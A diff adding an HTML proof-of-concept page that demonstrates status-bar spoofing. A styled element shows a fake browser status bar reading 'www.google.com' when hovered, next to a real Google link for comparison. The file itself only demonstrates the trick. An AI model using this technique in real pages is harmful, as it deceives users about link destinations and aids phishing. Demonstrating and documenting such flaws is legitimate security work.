@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- 设置字符编码为 UTF-8 -->
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+  <!-- 文档标题 -->
+  <title>Status Bar Spoofing Vulnerability</title>
+  <style>
+    /* 定义伪造状态栏的样式 */
+    .chrome {
+      background: #DFDFDF; /* 背景颜色 */
+      width: 230px; /* 宽度 */
+      height: 23px; /* 高度 */
+      -webkit-border-top-right-radius: 4px; /* 圆角效果 */
+      font-size: 12px; /* 字体大小 */
+      font-family: "微软雅黑"; /* 字体类型 */
+      color: #666666; /* 字体颜色 */
+      line-height: 23px; /* 行高 */
+      padding: 0px 0px 0px 3px; /* 内边距 */
+      position: absolute; /* 绝对定位 */
+      bottom: 0px; /* 底部距离 */
+      left: 0px; /* 左侧距离 */
+      display: none; /* 默认隐藏状态 */
+    }
+    /* 定义链接的样式 */
+    .link {
+      color: blue; /* 链接颜色 */
+      text-decoration: underline; /* 下划线 */
+      cursor: pointer; /* 指针光标 */
+    }
+  </style>
+  <script>
+    // 显示或隐藏伪造状态栏
+    function show(status) {
+      document.getElementById("statusbar").style.display = status;
+    }
+    // 跳转到指定的 URL
+    function goto(url) {
+      location = url;
+    }
+  </script>
+</head>
+<body>
+  <br><br><br>
+  <center>
+    <h1>CSS Handling Status Bar Spoofing Vulnerability</h1>
+    <br><br><br><br>
+    <b>The True Status Bar:</b>
+    <!-- 真实的状态栏链接 -->
+    <a href="http://www.google.com">Google</a>
+    <br><br>
+    <b>The Spoof Status Bar:</b>
+    <!-- 伪造的状态栏，鼠标悬停时显示 -->
+    <span class="link" onMouseover="show('block');" onMouseout="show('none')">Google</span>
+    <br><br>
+  </center>
+  <!-- 伪造的状态栏元素 -->
+  <div id="statusbar" class="chrome">www.google.com</div>
+</body>
+</html>
